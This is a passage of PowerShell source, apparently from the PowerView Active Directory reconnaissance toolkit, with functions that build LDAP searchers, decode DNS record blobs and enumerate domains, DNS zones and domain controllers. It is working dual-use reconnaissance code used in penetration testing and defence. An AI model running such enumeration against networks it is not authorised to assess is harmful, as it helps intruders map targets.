                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # convert the GUID to a string
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # convert timestamps
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # otherwise just a string
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # try to convert misc com objects
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-DomainSearcher {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain  

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI searcher functions (Verb-Domain*).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.

.EXAMPLE

Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                # see if we can grab the user DNS logon domain from environment variables
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            # see if we can grab the user DNS logon domain from environment variables
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            # otherwise, resort to Get-Domain to retrieve the current domain object
            write-verbose "get-domain"
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters['Server']) {
            # if there's not a specified server to bind to, try to pull a logon server from ENV variables
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # bind to the inital search object using alternate credentials
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # reverse for big endian
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($RDataType -eq 6) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($RDataType -eq 13) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($RDataType -eq 15) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($RDataType -eq 28) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($RDataType -eq 33) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {
<#
.SYNOPSIS

Enumerates the Active Directory DNS zones for a given domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSZone

Retrieves the DNS zones for the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local

Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.

.OUTPUTS

PowerView.DNSZone

Outputs custom PSObjects with detailed information about the DNS zone.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
<#
.SYNOPSIS

Enumerates the Active Directory DNS records for a given zone.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  

.DESCRIPTION

Given a specific Active Directory DNS zone name, query for all 'dnsNode'
LDAP entries using that zone as the search base. Return all DNS entry results
and use Convert-DNSRecord to try to convert the binary DNS record blobs.

.PARAMETER ZoneName

Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSRecord -ZoneName testlab.local

Retrieve all records for the testlab.local zone.

.EXAMPLE

Get-DomainDNSZone | Get-DomainDNSRecord

Retrieve all records for all zones in the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local

Retrieve all records for all zones in the dev.testlab.local domain.

.OUTPUTS

PowerView.DNSRecord

Outputs custom PSObjects with detailed information about the DNS record entry.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName

                    # convert the record and extract the properties
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # TODO: handle multiple nested records properly?
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {
<#
.SYNOPSIS

Returns the domain object for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain name to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-Domain -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Domain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

A complex .NET domain object.

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}


function Get-DomainController {
<#
.SYNOPSIS

Return the domain controllers for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-Domain  

.DESCRIPTION

Enumerates the domain controllers for the current or specified domain.
By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
to search for domain controllers.

.PARAMETER Domain

The domain to query for domain controllers, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER LDAP

Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainController -Domain 'test.local'

Determine the domain controllers for 'test.local'.

.EXAMPLE

Get-DomainController -Domain 'test.local' -LDAP

Determine the domain controllers for 'test.local' using LDAP queries.

.EXAMPLE

'test.local' | Get-DomainController

Determine the domain controllers for 'test.local'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainController -Credential $Cred

.OUTPUTS

PowerView.Computer

Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.

System.DirectoryServices.ActiveDirectory.DomainController

If -LDAP isn't specified.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }

            # UAC specification for domain controllers
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
<#
.SYNOPSIS

Returns the forest object for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertTo-SID  

